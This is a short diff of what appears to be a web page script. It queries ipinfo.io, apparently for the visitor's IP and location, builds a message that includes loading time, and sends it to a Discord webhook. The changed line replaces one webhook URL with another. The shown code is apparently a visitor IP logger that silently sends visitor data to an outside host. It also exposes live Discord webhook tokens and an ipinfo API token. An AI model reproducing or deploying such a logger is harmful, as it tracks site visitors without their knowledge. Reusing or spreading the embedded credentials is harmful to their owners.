@@ -84,7 +84,7 @@ fetch('https://ipinfo.io/json?token=f8e54fde451c64')
             Loading Time: ${loadTime}
         `;
 
-        const webhookUrl = 'https://discord.com/api/webhooks/1262514002462900307/-AYAvbIVTGri2O0J9Es-0b-BxGGGyJyVVGJYdTAKEHR_9iH5mWvboW2jSfAaKyNBHuLX';  // Asegúrate de añadir aquí tu URL de webhook
+        const webhookUrl = 'https://discord.com/api/webhooks/1262513870040334436/ibH55sMzKg2EzJehCgg2u3sK6ZKQVwdEiV_q5CkMxbgV95Fs7pi1pyUjQQpHUbscEmHE';  // Asegúrate de añadir aquí tu URL de webhook
 
         const embed_message = {
             embeds: [
